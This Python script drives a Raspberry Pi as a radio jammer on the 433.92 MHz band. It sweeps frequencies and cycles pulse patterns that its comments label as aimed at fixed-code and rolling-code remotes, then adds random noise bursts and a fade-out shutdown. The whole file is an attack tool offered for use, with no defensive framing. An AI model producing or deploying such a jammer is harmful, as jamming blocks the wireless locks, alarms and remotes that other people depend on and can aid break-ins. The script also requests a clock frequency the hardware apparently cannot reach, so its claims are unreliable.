import pigpio
import time
import random
import signal
import sys
import subprocess

# Configuration
GPIO_TX_PIN = 20  # GPIO pin for RF transmitter
FREQUENCY_BASE = 433.92e6  # Base frequency (433.92 MHz)
FREQUENCY_RANGE = 0.2e6   # Sweep range (±100 kHz)
PULSE_PATTERNS = [
    # (pulse_on, pulse_off, repeat_count) for different jamming patterns
    (100, 100, 50),   # Fast pattern for fixed codes
    (400, 400, 30),   # Standard pattern for fixed codes
    (250, 500, 40),   # Pattern for rolling codes
    (500, 250, 40),   # Reverse rolling code pattern
    (50, 50, 100),    # High-frequency noise
    (1000, 1000, 20), # Long pulse for proprietary protocols
]
BURST_DURATION = 0.05  # Duration of each burst in seconds
BURST_PAUSE = 0.02    # Pause between bursts in seconds
FADE_OUT_STEPS = 10   # Number of steps for smooth shutdown
FADE_OUT_BASE = 1000  # Starting pulse duration for fade-out (µs)

# Initialize pigpio
try:
    subprocess.run(["pgrep", "pigpiod"], check=True, capture_output=True)
    print("✅ pigpiod is running")
except subprocess.CalledProcessError:
    try:
        subprocess.run(["sudo", "pigpiod"], check=True)
        print("🔄 Started pigpiod daemon")
    except Exception as e:
        print(f"❌ Error starting pigpiod: {e}")
        sys.exit(1)

pi = pigpio.pi()
if not pi.connected:
    print("❌ Error: Failed to connect to pigpiod. Run 'sudo pigpiod' first!")
    sys.exit(1)

pi.set_mode(GPIO_TX_PIN, pigpio.OUTPUT)
pi.hardware_clock(GPIO_TX_PIN, int(FREQUENCY_BASE))  # Set initial frequency
print(f"🔧 Initialized GPIO {GPIO_TX_PIN} for jamming")

# State
running = True

def smooth_shutdown(signal, frame):
    """Handle graceful shutdown with fade-out."""
    global running
    running = False
    print("🛑 Initiating smooth shutdown...")

def generate_jamming_wave(pulse_on, pulse_off, repeat_count):
    """Generate a wave with specified pulse durations."""
    try:
        pi.wave_clear()
        pulses = []
        
        for _ in range(repeat_count):
            pulses.append(pigpio.pulse(1 << GPIO_TX_PIN, 0, pulse_on))
            pulses.append(pigpio.pulse(0, 1 << GPIO_TX_PIN, pulse_off))
        
        pi.wave_add_generic(pulses)
        wave_id = pi.wave_create()
        if wave_id < 0:
            print(f"⚠️ Failed to create wave: {wave_id}")
        return wave_id
    except Exception as e:
        print(f"⚠️ Error generating wave: {e}")
        return -1

def sweep_frequency():
    """Sweep frequency around the base frequency."""
    try:
        freq_steps = 10
        step_size = FREQUENCY_RANGE / freq_steps
        for i in range(-freq_steps // 2, freq_steps // 2 + 1):
            if not running:
                break
            freq = FREQUENCY_BASE + (i * step_size)
            pi.hardware_clock(GPIO_TX_PIN, int(freq))
            time.sleep(0.005)  # Short dwell time
    except Exception as e:
        print(f"⚠️ Error in frequency sweep: {e}")

def rf_jamming():
    """Enhanced RF jamming with smooth shutdown."""
    global running
    try:
        print("🚨 Starting enhanced RF jammer on 433 MHz...")
        while running:
            # Sweep frequency to cover 433.82-433.98 MHz
            sweep_frequency()

            # Iterate through different pulse patterns
            for pulse_on, pulse_off, repeat_count in PULSE_PATTERNS:
                if not running:
                    break

                # Generate and send jamming pattern
                wave_id = generate_jamming_wave(pulse_on, pulse_off, repeat_count)
                if wave_id >= 0:
                    pi.wave_send_repeat(wave_id)
                    time.sleep(BURST_DURATION)
                    pi.wave_tx_stop()
                    pi.wave_delete(wave_id)
                    time.sleep(BURST_PAUSE)

                # Random noise burst
                random_pulse = random.randint(20, 200)
                wave_id = generate_jamming_wave(random_pulse, random_pulse, 50)
                if wave_id >= 0:
                    pi.wave_send_repeat(wave_id)
                    time.sleep(BURST_DURATION / 2)
                    pi.wave_tx_stop()
                    pi.wave_delete(wave_id)

        # Smooth fade-out
        print("🌙 Starting fade-out sequence...")
        for i in range(FADE_OUT_STEPS, 0, -1):
            pulse_duration = int(FADE_OUT_BASE * (i / FADE_OUT_STEPS))
            wave_id = generate_jamming_wave(pulse_duration, pulse_duration, 20)
            if wave_id >= 0:
                pi.wave_send_repeat(wave_id)
                time.sleep(0.3)  # Slower transition for smoothness
                pi.wave_tx_stop()
                pi.wave_delete(wave_id)
            print(f"🔅 Fade-out step {FADE_OUT_STEPS - i + 1}/{FADE_OUT_STEPS}, pulse: {pulse_duration}µs")

        # Final cleanup
        pi.wave_tx_stop()
        pi.wave_clear()
        pi.write(GPIO_TX_PIN, 0)
        pi.hardware_clock(GPIO_TX_PIN, 0)
        pi.stop()
        print("✅ RF jamming stopped smoothly with fade-out.")

    except Exception as e:
        print(f"⚠️ Error during jamming: {e}")
        # Ensure cleanup on error
        pi.wave_tx_stop()
        pi.wave_clear()
        pi.write(GPIO_TX_PIN, 0)
        pi.hardware_clock(GPIO_TX_PIN, 0)
        pi.stop()
        print("🧹 Emergency cleanup completed.")

if __name__ == "__main__":
    signal.signal(signal.SIGINT, smooth_shutdown)
    rf_jamming()